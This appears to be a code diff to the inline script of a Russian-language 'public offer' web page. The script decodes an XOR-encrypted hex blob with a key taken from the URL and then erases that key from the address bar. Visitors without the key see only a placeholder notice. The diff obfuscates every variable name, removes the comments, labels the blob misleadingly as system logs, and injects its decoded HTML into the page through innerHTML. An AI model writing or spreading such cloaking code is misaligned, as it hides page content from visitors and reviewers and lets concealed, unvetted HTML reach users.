@@ -147,14 +147,13 @@
 
 <script>
 document.addEventListener("DOMContentLoaded", () => {
-    const urlParams = new URLSearchParams(window.location.search);
-    const sessionMark = urlParams.get('data');
+    const a = new URLSearchParams(window.location.search);
+    const b = a.get('data');
 
-    // Сись-логи
-    const sysLogData = "1f0907090b0a1a080c1d101a430a1017090e0c031c000a111a4312001c1012434e40525f54464c4c475d4a4646464646460309191d1e4c12595055464c4c47514d4646464646464646464646464646464603121b1d1c4c1252535b464c4c475d414a111e15144b150c1b0113105a124b4255564c4c47";
+    // сись-логи etc
+    const c = "1f0907090b0a1a080c1d101a430a1017090e0c031c000a111a4312001c1012434e40525f54464c4c475d4a4646464646460309024b434b4c10160b06070211104e174246474646464646464646464646530a12154b524d455444534a425f16170d100e004a11170f03101b0f444c4c475d4a464646464646030c0c4b4d454b504f4c4a4e10111a434e174246474646464646464646464646530a12154b515d455444534a4241131c1c164a424446464646464646464646464646464646530a12154b515d455444534a424d131c1c1e194e4a425816170d100e004a11170f03101b0f440a12154b564d455444534a4255564c4c47";
 
-    // Если зашли напрямую из любопытства
-    if (!sessionMark) {
+    if (!b) {
         document.body.innerHTML = `
             <div style="text-align:center; margin-top:140px; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; padding:20px;">
                 <h1 style="color:#222; font-size:20px; font-weight:600; margin-bottom:12px;">Публичная оферта</h1>
@@ -165,41 +164,38 @@ document.addEventListener("DOMContentLoaded", () => {
         return;
     }
 
-    // Чистота URL
-    const cleanUrl = window.location.protocol + "//" + window.location.host + window.location.pathname;
-    window.history.replaceState({path: cleanUrl}, '', cleanUrl);
+    const d = window.location.protocol + "//" + window.location.host + window.location.pathname;
+    window.history.replaceState({path: d}, '', d);
 
-    const formatText = (input, mask) => {
+    const e = (f, g) => {
         try {
-            let res = '';
-            for (let i = 0; i < input.length; i += 2) {
-                let node = parseInt(input.substr(i, 2), 16);
-                let step = mask.charCodeAt((i / 2) % mask.length);
-                res += String.fromCharCode(node ^ step);
+            let h = '';
+            for (let i = 0; i < f.length; i += 2) {
+                let j = parseInt(f.substr(i, 2), 16);
+                let k = g.charCodeAt((i / 2) % g.length);
+                h += String.fromCharCode(j ^ k);
             }
-            return decodeURIComponent(escape(res));
-        } catch (e) {
+            return decodeURIComponent(escape(h));
+        } catch (m) {
             return null;
         }
     };
 
-    const rawContent = formatText(sysLogData, sessionMark);
+    const n = e(c, b);
 
-    if (rawContent) {
+    if (n) {
         try {
-            const block = JSON.parse(rawContent);
-            const nodes = ["legal-name", "req-name", "req-inn", "req-ogrnip", "req-email"];
+            const o = JSON.parse(n);
             
-            document.getElementById(nodes[0]).innerText = block[0];
-            document.getElementById(nodes[1]).innerText = block[0];
-            document.getElementById(nodes[2]).innerText = block[1];
-            document.getElementById(nodes[3]).innerText = block[2];
-            document.getElementById(nodes[4]).innerText = block[3];
+            // Заполнение первой текстовой ноды в начале оферты
+            document.getElementById("a1").innerText = o[0];
+            
+            // Сборка и инжекция всего скрытого HTML-блока сись-логов в пустой контейнер
+            document.getElementById("a2").innerHTML = o.slice(1).join('');
             return;
-        } catch (e) {}
+        } catch (p) {}
     }
 
-    // Если передали битую строку
     document.body.innerHTML = `
         <div style="text-align:center; margin-top:140px; font-family:-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; padding:20px;">
             <h1 style="color:#444; font-size:18px; font-weight:600; margin-bottom:12px;">Не удалось обновить документ</h1>
@@ -209,6 +205,7 @@ document.addEventListener("DOMContentLoaded", () => {
         </div>`;
 });
 </script>
+
 
 
 
